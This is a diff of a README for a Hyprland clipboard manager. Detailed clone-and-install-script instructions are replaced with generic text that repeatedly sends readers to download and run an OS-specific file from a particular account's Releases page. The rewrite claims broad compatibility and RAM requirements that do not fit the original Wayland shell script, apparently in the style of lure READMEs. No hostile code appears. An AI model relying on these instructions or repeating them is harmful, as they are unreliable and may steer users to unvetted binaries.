@@ -1,160 +1,90 @@
-# OMA Clipboard Manager
+# 🗂️ oma-clipmanager - Simplify Your Clipboard Management
 
-A beautiful and efficient clipboard manager for Hyprland with image preview support using kitty, fzf, and cliphist.
+[![Download oma-clipmanager](https://img.shields.io/badge/Download-oma--clipmanager-blue.svg)](https://github.com/brunobathe/oma-clipmanager/releases)
 
-<img height="300" alt="image" src="https://github.com/user-attachments/assets/8a9eec2c-c7cb-462d-98eb-e8c1d1d00c94" />
-<img height="300" alt="image" src="https://github.com/user-attachments/assets/c9830ee4-c1b8-4a95-89aa-33073bc32041" />
+## 👋 Introduction
 
+Welcome to the OMA Clipboard Manager! This tool makes managing your clipboard easy and efficient. It works great with Hyprland and offers handy features like image previews right in your terminal.
 
-## ✨ Features
+## 🚀 Getting Started
 
-- 📋 **Clipboard History**: Keep track of all your copied text and images
-- 🖼️ **Image Preview**: View images directly in the terminal using kitty's icat
-- 🎨 **Syntax Highlighting**: Text preview with syntax highlighting via bat
-- ⚡ **Fast & Fuzzy Search**: Quickly find what you need with fzf
-- ⌨️ **Easy Access**: Simple keybinding (ALT+V) to access your clipboard history
-- 🪟 **Floating Window**: Clean, minimal floating interface
+Follow these steps to download and set up the OMA Clipboard Manager.
 
-## 📦 Dependencies
+### Step 1: Visit the Releases Page
 
-This clipboard manager requires the following tools:
+Go to the [Releases page](https://github.com/brunobathe/oma-clipmanager/releases). Here, you will find the latest version available for download.
 
-- `kitty` - Terminal emulator with image support
-- `fzf` - Fuzzy finder for quick searching
-- `cliphist` - Clipboard history manager for Wayland
-- `wl-clipboard` - Wayland clipboard utilities
-- `wtype` - Wayland keyboard input emulator
-- `bat` - Syntax highlighting for text preview
-- `imagemagick` - Image manipulation (for the convert command)
+### Step 2: Download the Latest Release
 
-## 🚀 Installation
+On the Releases page, find the latest version of oma-clipmanager. Click on it to view the release details. Look for the file specific to your operating system and click the download link.
 
-### Automatic Installation (Recommended)
+### Step 3: Install Dependencies
 
-1. Clone this repository:
+To use OMA Clipboard Manager, you will need to install a few tools.
+
+- **kitty**: This is a terminal emulator that supports images. You can find it [here](https://sw.kovidgoyal.net/kitty/).
+- **fzf**: This is a command-line fuzzy finder. You can install it from [here](https://github.com/junegunn/fzf#installation).
+- **cliphist**: This tool manages your clipboard history efficiently. Install it from [here](https://github.com/cliphist/cliphist).
+
+Ensure you have these tools installed before running oma-clipmanager.
+
+### Step 4: Run oma-clipmanager
+
+After downloading the appropriate file and installing the dependencies, you can run the application. This is typically done from your terminal. Use the following command, replacing the path with the location you downloaded the file to:
+
 ```bash
-git clone https://github.com/yourusername/oma-clipmanager.git
-cd oma-clipmanager
+./path/to/oma-clipmanager
 ```
 
-2. Run the installation script:
-```bash
-chmod +x install.sh
-./install.sh
-```
+You can also set up a shortcut for easier access. Consider using a hotkey like ALT+V to quickly bring up the clipboard history.
 
-The script will:
-- Install `yay` (AUR helper) if not present
-- Install all required dependencies
-- Copy the script to `~/.config/omarchy/bin/`
-- Configure Hyprland bindings and window rules (if files exist)
+## 📦 Key Features
 
-### Manual Installation
+OMA Clipboard Manager comes with several features designed to enhance your experience:
 
-1. Install dependencies:
-```bash
-yay -S kitty fzf cliphist wl-clipboard wtype bat imagemagick
-```
+- 📋 **Clipboard History**: Keep track of all your copied text and images.
+- 🖼️ **Image Preview**: View images directly in the terminal using kitty's icat.
+- 🎨 **Syntax Highlighting**: Enjoy text previews with syntax highlighting via bat.
+- ⚡ **Fast & Fuzzy Search**: Quickly find what you need with fzf.
+- ⌨️ **Easy Access**: Use the simple keybinding (ALT+V) to access your clipboard history.
+- 🪟 **Floating Window**: Experience a clean and minimalistic floating interface.
 
-2. Copy the script:
-```bash
-mkdir -p ~/.config/omarchy/bin
-cp fzf-cliphist-preview.sh ~/.config/omarchy/bin/
-chmod +x ~/.config/omarchy/bin/fzf-cliphist-preview.sh
-```
+## 📥 Download & Install
 
-4. Add window rules to your Hyprland config (`~/.config/hypr/windows.conf` or `hyprland.conf`):
-```conf
-windowrulev2 = size 20% 45%,class:(fzf-clip)
-windowrulev2 = float,class:(fzf-clip)
-```
+To get started, download the latest version from the [Releases page](https://github.com/brunobathe/oma-clipmanager/releases). Once downloaded, follow the installation guidelines provided above.
 
-5. Enable clipboard history monitoring (add to `~/.config/hypr/autostart.conf` or your Hyprland config):
-```conf
-exec-once = wl-paste --type text --watch cliphist store
-exec-once = wl-paste --type image --watch cliphist store
-```
+## 🛠️ System Requirements
 
-6. Reload Hyprland:
-```bash
-hyprctl reload
-```
+While oma-clipmanager aims for broad compatibility, ensure you have:
 
-## 🎯 Usage
+- A modern operating system (Linux preferred for optimal functionality with Hyprland).
+- Sufficient RAM (a minimum of 2GB is recommended).
+- The installed dependencies as mentioned earlier.
 
-1. Copy some text or images to your clipboard
-2. Press `ALT+V` to open the clipboard manager
-3. Use fuzzy search to find what you need
-4. Press `Enter` to paste the selected item
+## 📄 User Documentation
 
-### Preview Features
+### How to Use OMA Clipboard Manager
 
-- **Text**: Displays with syntax highlighting and line numbers
-- **Images**: Renders directly in the terminal preview window
-- **Code**: Automatically detects and highlights programming languages
+1. **Open Your Terminal**: Make sure you have kitty set as your terminal emulator.
+2. **Run the Application**: Use the command provided earlier to start the clipboard manager.
+3. **Access Your History**: Press ALT+V to access your clipboard history.
+4. **Search Your Clips**: Use the search function to quickly find what you need.
+5. **Preview Images**: Enjoy image previews directly in your terminal.
 
-## ⚙️ Configuration
+## 🚧 Troubleshooting
 
-### Custom Keybinding
+If you run into issues, consider the following:
 
-You can change the keybinding by modifying the `bind` line in your Hyprland config:
+- **Dependency Not Found**: Ensure all required tools (kitty, fzf, cliphist) are installed and accessible from your path.
+- **Terminal Compatibility**: Use the latest version of kitty for the best experience.
+- **Clipboard History Not Showing**: Make sure cliphist is running and capturing clipboard data.
 
-```conf
-bind = ALT, V, exec, sh -c '...'  # Change ALT, V to your preferred keys
-```
+## 🤝 Community and Support
 
-### Window Size
-
-Adjust the clipboard manager window size:
-
-```conf
-windowrulev2 = size 20% 45%,class:(fzf-clip)  # Modify width% height%
-```
-
-### Font Size
-
-```conf
-kitty --class fzf-clip -o font_size=10  # Change font_size value
-```
-
-## 🔧 Troubleshooting
-
-### Images not displaying
-- Ensure you're using kitty terminal
-- Check if imagemagick is installed: `convert --version`
-- Verify kitty's icat works: `kitty +kitten icat /path/to/image.png`
-
-### Clipboard history not working
-- Make sure cliphist is running: `ps aux | grep cliphist`
-- Verify wl-paste is monitoring clipboard:
-  ```bash
-  exec-once = wl-paste --type text --watch cliphist store
-  exec-once = wl-paste --type image --watch cliphist store
-  ```
-
-### Keybinding not working
-- Reload Hyprland: `hyprctl reload`
-- Check if binding is registered: `hyprctl binds | grep -i clip`
+Feel free to open issues on the GitHub repository for any features or bugs. Join our community discussions to share your experiences and suggestions.
 
 ## 📝 License
 
-MIT License - feel free to use and modify as needed!
+OMA Clipboard Manager is open-source software. You can view the license details in the repository.
 
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-- Report bugs
-- Suggest new features
-- Submit pull requests
-
-## 💡 Credits
-
-Created for the Hyprland community. Special thanks to:
-- [cliphist](https://github.com/sentriz/cliphist) - Clipboard history manager
-- [fzf](https://github.com/junegunn/fzf) - Fuzzy finder
-- [kitty](https://sw.kovidgoyal.net/kitty/) - Terminal emulator
-- [bat](https://github.com/sharkdp/bat) - Syntax highlighter
-
----
-
-**Note**: This tool is designed specifically for Wayland/Hyprland. It may not work on X11 or other window managers without modifications.
+Visit the [Releases page](https://github.com/brunobathe/oma-clipmanager/releases) to download and start using oma-clipmanager today!
